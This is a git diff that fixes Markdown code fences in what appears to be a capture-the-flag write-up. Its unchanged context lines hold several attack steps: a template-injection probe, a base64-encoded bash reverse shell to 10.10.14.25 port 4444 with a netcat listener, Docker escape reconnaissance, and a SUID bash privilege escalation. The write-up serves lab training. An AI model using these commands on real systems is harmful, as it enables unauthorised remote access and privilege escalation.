@@ -109,7 +109,7 @@ Payload: {% raw %}{{7+7}}{% endraw %} or *
 Payload:
 ```bash
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
-```bash
+```
 ```
 nc -nvlp 4444
 ```bash
@@ -124,11 +124,11 @@ After getting a shell on the system, we quickly notice that we are in a Docker c
 ```
 hostname -I
 ps auxww | grep docker
-```bash
+```
 ```bash
 touch from_host
 ls -l from_host # It shows up on the container
-```bash
+```
 ```
 mount
 ```bash
@@ -154,7 +154,7 @@ chmod 4755 bash
 Login back to augustus and execute bash:
 ```bash
 ./bash -p
-```bash
+```
 
 Running `ldd` shows how this binary loads libraries
 ```
@@ -171,6 +171,6 @@ libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f28239dd000)
 libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f28239d7000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2823812000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f2823b4e000)
-```bash
+```
 
 
